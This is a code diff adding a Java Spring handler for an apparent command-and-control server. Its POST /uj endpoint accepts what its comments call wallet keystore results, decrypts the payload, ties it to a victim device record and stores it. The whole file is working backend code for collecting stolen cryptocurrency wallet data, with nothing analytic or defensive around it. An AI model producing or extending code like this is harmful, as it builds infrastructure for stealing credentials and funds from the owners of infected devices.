@@ -1,0 +1,50 @@
+package com.consume.service.handlers;
+
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.stereotype.Component;
+import org.springframework.transaction.annotation.Propagation;
+import org.springframework.transaction.annotation.Transactional;
+
+import com.consume.service.C2BusinessStore;
+import com.consume.service.C2HandlerContext;
+import com.consume.service.AbstractC2Handler;
+
+/**
+ * POST /uj：钱包 keystore / result（XADD.md §5.8）。
+ *
+ * 解密 → save_uj_decrypt → 关联 c2_records.device_id。
+ */
+@Component
+public class HandleUj extends AbstractC2Handler {
+
+    @Autowired
+    private C2BusinessStore store;
+
+    @Override
+    public String path() {
+        return "/uj";
+    }
+
+    @Override
+    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)
+    public void handle(C2HandlerContext ctx) throws Exception {
+        if (!"POST".equalsIgnoreCase(ctx.getMethod())) {
+            log.info("正常日志:[c2_handlers] /uj 非 POST，跳过, id={}", ctx.getRecordId());
+            return;
+        }
+        resolveDomain(ctx);
+//        String plain = decrypt(ctx, "result", "d", "f", "u", "d3");
+
+        // 先解析设备（uj_decrypt 需要 device_row_id）
+        String d = ctx.plaintextStr("d");
+        String f = ctx.plaintextStr("f");
+        String u = ctx.plaintextStr("u");
+        deviceResolver.resolveAndLink(ctx, d, f, u, null, null);
+
+        // 落库 uj_decrypt（无论解密成功失败都记录）
+        store.saveUjDecrypt(ctx, ctx.getPlaintext());
+
+        log.debug("正常日志:[c2_handlers] call handle_uj 完成, id={}, path={}, decryptOk={}",
+                ctx.getRecordId(), ctx.getPath(), ctx.isDecryptOk());
+    }
+}
